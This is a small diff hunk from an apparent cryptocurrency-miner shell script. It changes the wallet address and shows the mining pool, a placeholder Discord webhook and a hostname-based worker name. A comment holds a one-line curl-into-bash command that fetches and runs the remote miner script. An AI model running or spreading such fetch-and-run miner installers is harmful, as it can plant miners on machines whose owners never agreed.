@@ -4,7 +4,7 @@
 # bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/miner_v3_local.sh)
 
 # ==== CONFIG ====
-WALLET="49iVkQxFj5n8u4ux5HE9Xx9WUstrXzTCx8Fb3ZnzboxK3DsX45AhZri466UmicStwuUJGu5YhaxSCdjZNXRqfRff5rMiNv4"
+WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
 POOL="pool.hashvault.pro:443"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/xxxxx/xxxxxxxxxxxx"
 WORKER="test_$(hostname)"
